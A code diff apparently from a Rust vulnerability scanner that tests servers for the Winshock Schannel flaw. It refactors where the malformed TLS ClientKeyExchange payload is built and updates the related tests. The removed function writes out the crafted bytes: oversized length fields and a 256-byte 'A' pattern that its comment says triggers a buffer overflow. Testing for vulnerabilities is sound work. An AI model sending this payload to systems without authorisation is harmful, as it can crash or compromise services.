@@ -12,6 +12,7 @@ use std::time::Duration;
 use tokio::io::AsyncWriteExt;
 
 mod client_hello;
+mod messages;
 mod read_io;
 mod result;
 
@@ -195,7 +196,7 @@ impl WinshockTester {
         match read_io::complete_tls_record(&mut stream, &mut buffer, Duration::from_secs(3)).await {
             Ok(n) if n > 0 => {
                 // Send malformed ClientKeyExchange that triggers Winshock
-                let malformed_cke = self.build_malformed_client_key_exchange();
+                let malformed_cke = messages::malformed_client_key_exchange();
                 stream.write_all(&malformed_cke).await?;
 
                 // Try to read response
@@ -241,23 +242,6 @@ impl WinshockTester {
             _ => Ok(MalformedHandshakeStatus::Inconclusive),
         }
     }
-
-    /// Build malformed ClientKeyExchange that triggers Winshock
-    fn build_malformed_client_key_exchange(&self) -> Vec<u8> {
-        let mut msg = vec![
-            0x16, 0x03, 0x03, // TLS Record: Handshake (TLS 1.2)
-            0xff, 0xff, // Malformed length (triggers vulnerability)
-            0x10, // Handshake: ClientKeyExchange
-            0xff, 0xff, 0xff, // Malformed handshake length
-            0xff, 0xff, // Encrypted PMS with malformed length
-        ];
-
-        // Crafted payload that triggers buffer overflow in Schannel
-        // This is a simplified version - real exploit would be more sophisticated
-        msg.extend_from_slice(&[0x41; 256]); // 'A' pattern
-
-        msg
-    }
 }
 
 fn openssl_hostname_and_sni(target_hostname: &str) -> (String, bool) {
@@ -289,15 +273,7 @@ mod tests {
 
     #[test]
     fn test_malformed_cke_build() {
-        let target = Target::with_ips(
-            "example.com".to_string(),
-            443,
-            vec!["93.184.216.34".parse().unwrap()],
-        )
-        .unwrap();
-
-        let tester = WinshockTester::new(target);
-        let malformed = tester.build_malformed_client_key_exchange();
+        let malformed = messages::malformed_client_key_exchange();
 
         assert!(malformed.len() > 10);
         assert_eq!(malformed[0], 0x16); // Handshake record
@@ -315,15 +291,7 @@ mod tests {
 
     #[test]
     fn test_malformed_cke_contains_padding_pattern() {
-        let target = Target::with_ips(
-            "example.com".to_string(),
-            443,
-            vec!["93.184.216.34".parse().unwrap()],
-        )
-        .unwrap();
-
-        let tester = WinshockTester::new(target);
-        let malformed = tester.build_malformed_client_key_exchange();
+        let malformed = messages::malformed_client_key_exchange();
 
         assert!(malformed.windows(4).any(|w| w == [0x41, 0x41, 0x41, 0x41]));
         assert!(malformed.len() >= 256);
@@ -331,15 +299,7 @@ mod tests {
 
     #[test]
     fn test_malformed_cke_header_lengths() {
-        let target = Target::with_ips(
-            "example.com".to_string(),
-            443,
-            vec!["93.184.216.34".parse().unwrap()],
-        )
-        .unwrap();
-
-        let tester = WinshockTester::new(target);
-        let malformed = tester.build_malformed_client_key_exchange();
+        let malformed = messages::malformed_client_key_exchange();
 
         assert_eq!(malformed[3], 0xff);
         assert_eq!(malformed[4], 0xff);
